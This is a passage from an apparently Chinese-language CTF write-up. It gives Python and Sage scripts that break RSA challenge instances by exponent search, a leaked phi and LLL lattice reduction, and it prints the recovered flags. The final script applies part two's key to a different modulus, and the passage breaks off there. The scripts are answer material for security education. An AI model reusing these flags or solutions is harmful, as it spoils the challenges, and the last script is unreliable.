g</span><br><span class="line">u = h // g</span><br><span class="line">v = h % g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def worker_search(params):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    工作进程函数，用于在指定的r和s范围内搜索c_exponent。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    r_start, r_end, s_start, s_end, D, b, final, N = params</span><br><span class="line">    for r in range(r_start, r_end):</span><br><span class="line">        target_exponent = r * D</span><br><span class="line">        for s in range(s_start, s_end):</span><br><span class="line">            c_exponent = target_exponent + s</span><br><span class="line">            current = powmod(b, c_exponent, N)</span><br><span class="line">            if current == final:</span><br><span class="line">                return c_exponent</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve_c_parallel(num_processes=4, D_multiplier=2):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    使用多进程并行化搜索c，使得 b^c ≡ final mod N。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    sqrt_N = iroot(N, 2)[0]</span><br><span class="line">    C_approx = sqrt_N // (g * g)</span><br><span class="line"></span><br><span class="line">    b = powmod(2, g, N)</span><br><span class="line">    final = powmod(b, u, N)</span><br><span class="line"></span><br><span class="line">    for i in range(2, int(C_approx) + 1):</span><br><span class="line">        # 计算D</span><br><span class="line">        D_root, is_exact = iroot(C_approx, 2)</span><br><span class="line">        D = (D_root + 1) * i</span><br><span class="line"></span><br><span class="line">        # 定义r和s的搜索范围，并将r的范围划分为多个块以并行处理</span><br><span class="line">        step = D // num_processes if D &gt; num_processes else 1</span><br><span class="line">        tasks = []</span><br><span class="line">        for p in range(num_processes):</span><br><span class="line">            r_start = p * step</span><br><span class="line">            r_end = (p + 1) * step if p &lt; num_processes - 1 else D</span><br><span class="line">            s_start = 0</span><br><span class="line">            s_end = D</span><br><span class="line">            params = (r_start, r_end, s_start, s_end, D, b, final, N)</span><br><span class="line">            tasks.append(params)</span><br><span class="line"></span><br><span class="line">        # 创建进程池并分配任务</span><br><span class="line">        with mp.Pool(processes=num_processes) as pool:</span><br><span class="line">            results = pool.map(worker_search, tasks)</span><br><span class="line"></span><br><span class="line">        # 检查是否有任何工作进程找到了c_exponent</span><br><span class="line">        for res in results:</span><br><span class="line">            if res is not None:</span><br><span class="line">                print(f&quot;Solution found: c = &#123;res&#125;&quot;)</span><br><span class="line">                return res</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    c = solve_c_parallel()</span><br><span class="line">    if c is not None:</span><br><span class="line">        print(&quot;c:&quot;, c)</span><br><span class="line"></span><br><span class="line">        # 计算A和B</span><br><span class="line">        A = u - c</span><br><span class="line">        B = v + c * g</span><br><span class="line"></span><br><span class="line">        # 求解二次方程x^2 - Bx + A = 0</span><br><span class="line">        discriminant = B * B - 4 * A</span><br><span class="line">        sqrt_discriminant, is_perfect_square = iroot(discriminant, 2)</span><br><span class="line">        if not is_perfect_square or sqrt_discriminant * sqrt_discriminant != discriminant:</span><br><span class="line">            print(&quot;判别式不是完全平方数。&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        x = (B + sqrt_discriminant) // 2</span><br><span class="line">        y = (B - sqrt_discriminant) // 2</span><br><span class="line"></span><br><span class="line">        # 计算a和b</span><br><span class="line">        a_val = x // 2</span><br><span class="line">        b_val = y // 2</span><br><span class="line"></span><br><span class="line">        # 计算p和q</span><br><span class="line">        p = 2 * g * a_val + 1</span><br><span class="line">        q = 2 * g * b_val + 1</span><br><span class="line"></span><br><span class="line">        # 验证p和q是否为素数</span><br><span class="line">        if not is_prime(p):</span><br><span class="line">            print(&quot;p 不是素数。&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        if not is_prime(q):</span><br><span class="line">            print(&quot;q 不是素数。&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        # 计算phi(N)</span><br><span class="line">        phi_N = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">        # 计算私钥指数d</span><br><span class="line">        try:</span><br><span class="line">            d = invert(e, phi_N)</span><br><span class="line">        except ZeroDivisionError:</span><br><span class="line">            print(&quot;e与phi(N)不互质，无法找到逆元。&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        # 解密密文</span><br><span class="line">        m = powmod(C, d, N)</span><br><span class="line">        decrypted_message = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">        print(&quot;解密消息:&quot;, decrypted_message)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未找到c的解。&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Solution found: c = 51589121<br>c: 51589121<br> 解密消息: b’flag {bf82d1cd-67b1-42bd-a7b5-f119f0246dfe}’</p><p>有原题</p><p><span class="exturl" data-url="aHR0cHM6Ly9mNjFkLmdpdGh1Yi5pby9jcnlwdG8vUlNBL2h1d2FuZ2JlaTIwMTlfQ3J5cHRvMS8=">https://f61d.github.io/crypto/RSA/huwangbei2019_Crypto1/</span></p><h2 id="apbq"><a class="markdownIt-Anchor" href="#apbq">#</a> apbq：</h2><p>第一部分</p><p><em>ϕ</em>=<em>n</em>1−<em>h</em>1+1=<em>p</em>×<em>q</em>−(<em>p</em>+<em>q</em>)+1=(<em>p</em>−1)(<em>q</em>−1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"></span><br><span class="line">hint1 = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span><br><span class="line">n1,e1 = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)</span><br><span class="line">c1 = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span><br><span class="line">phi = n1-hint1+1</span><br><span class="line">d = gmpy2.invert(e1,phi)</span><br><span class="line">m = pow(c1,d,n1)</span><br><span class="line">flag1 =long_to_bytes(m)</span><br><span class="line">print(flag1)</span><br><span class="line">#b&#x27;flag&#123;yOu_can_&#x27;</span><br></pre></td></tr></table></figure><p>第二部分</p><p>想办法因式分解一个 RSA 模数 𝑛=𝑝×𝑞<em>n</em>=<em>p</em>×<em>q</em></p><p>先求出 p,q</p><p>然后定格矩阵<br> DownUniderCTF 2023 相似</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rvd25VbmRlckNURi9DaGFsbGVuZ2VzXzIwMjNfUHVibGljL2Jsb2IvbWFpbi9jcnlwdG8vYXBicS1yc2EtaWkvc29sdmUvc29sdi5zYWdl">https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/apbq-rsa-ii/solve/solv.sage</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"># n, c, hints</span><br><span class="line">c = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line"></span><br><span class="line">V = hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]</span><br><span class="line"></span><br><span class="line">k = 2^(512 - 180)</span><br><span class="line"></span><br><span class="line">M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[1:] for b in M.LLL()]</span><br><span class="line">M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == &#123;0&#125;]</span><br><span class="line"></span><br><span class="line">for s, t in itertools.product(range(100), repeat=2):</span><br><span class="line">    T = s*B[0] + t*B[1]</span><br><span class="line">    a1, a2, a3 = T[0], T[1], T[2]</span><br><span class="line">    kq = gcd(a1 * hints[1] - a2 * hints[0], n)</span><br><span class="line">    if 1 &lt; kq &lt; n:</span><br><span class="line">        print(&#x27;find!&#x27;, kq, s, t)</span><br><span class="line">        break</span><br><span class="line">for i in range(2**16, 1, -1):</span><br><span class="line">    if kq % i == 0:</span><br><span class="line">        kq //= i</span><br><span class="line">q = int(kq)</span><br><span class="line">p = int(n // kq)</span><br><span class="line">print(&#x27;p&#x27;, p)</span><br><span class="line">print(&#x27;q&#x27;,q)</span><br><span class="line">#8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br></pre></td></tr></table></figure><p>得到，p，q 直接解出第二部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"># kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class="line">m = pow(c2,d,n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line">print(q*p)</span><br><span class="line">print(flag2)</span><br><span class="line"># b&#x27;s0lve_the_@pb&#x27;</span><br></pre></td></tr></table></figure><p>第三部分：</p><p>发现这里可以直接用第二部分的 p， q</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"># # kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class="line">m = pow(c2,d,n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line">print(q*p)</span><br><span class="line">print(flag2)</span><br><span class="line"># b&#x27;s0lve_the_@pb&#x27;</span><br><span class="line"></span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class="line"></span><br><span class="line">n3,e3 = (94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581, 65537)</span><br><span class="line">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class="line">m3 = pow(c3,d,n)</span><br><span class="line">flag3= long_to_bytes(m3)</span><br><span class="line">print(flag3)</span><br><span class="line"># 